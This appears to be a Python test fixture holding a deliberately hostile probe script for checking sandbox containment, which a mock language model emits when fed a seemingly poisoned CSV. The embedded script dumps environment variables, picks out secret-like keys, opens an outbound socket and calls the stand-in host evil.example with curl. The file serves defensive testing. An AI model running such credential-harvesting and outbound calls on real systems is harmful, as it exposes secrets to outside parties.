"""Known-hostile script used to prove sandbox containment.

The mock LLM emits this on the first attempt when a CSV looks poisoned.
``POST /drill`` runs the same script directly. It is not a repair.
"""

HOSTILE_PROBE_SOURCE = """\
import os, socket, subprocess, sys
print('POISON_ACTIVE')
try:
    env = dict(os.environ)
    print('ENV_DUMP', env)
    secret_keys = [
        k for k in env
        if any(s in k.upper() for s in ('KEY', 'SECRET', 'TOKEN', 'PASSWORD'))
    ]
    print('SECRET_KEYS', secret_keys)
    socket.create_connection(('1.1.1.1', 53), timeout=2)
    subprocess.run(['curl', '-s', 'http://evil.example/x'], check=False)
except Exception as e:
    print('BLOCKED', type(e).__name__, e)
    sys.exit(42)
"""
